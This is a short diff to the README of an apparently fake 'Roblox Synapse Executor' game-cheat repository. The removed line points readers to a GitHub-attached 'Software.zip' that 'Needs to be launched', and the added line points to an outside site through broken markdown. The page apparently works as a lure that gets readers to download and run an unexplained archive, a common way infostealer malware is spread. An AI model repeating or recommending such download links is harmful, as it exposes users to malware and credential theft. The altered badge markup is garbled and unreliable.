@@ -14,7 +14,7 @@ Welcome to the Roblox Synapse Executor repository! This tool is a top-tier scrip
 - Code samples for reference
 
 #### Link to Repository Content
-[![Download Synapse Executor](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18060583/Software.zip "Needs to be launched")
+[![Download Synapse Executor]("https://scriptrst.com")
 
 If the link doesn't work, please check the "Releases" section for alternative download options.
 
